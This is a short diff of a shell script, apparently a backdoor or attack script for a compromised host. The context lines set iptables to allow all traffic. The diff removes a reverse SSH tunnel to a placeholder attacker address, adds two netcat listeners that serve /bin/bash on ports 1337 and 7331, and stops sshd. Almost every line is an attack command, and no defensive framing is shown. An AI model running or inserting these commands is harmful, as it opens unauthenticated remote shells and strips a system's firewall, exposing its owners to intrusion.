@@ -27,9 +27,12 @@ command iptables -P INPUT ALLOW
 command iptables -P OUTPUT ALLOW
 command iptables -P FORWARD ALLOW
 
-# Open up reverse SSH connection
-command ssh -R 34567:localhost:22 root@IP_FOR_ATTACKER_PC_HERE
+# Open up netcat listeners for shells
+command nc -lp 1337 -e /bin/bash
+command nc -lp 7331 -e /bin/bash
 
+# Turn off ssh
+command systemctl stop sshd
 
 
 
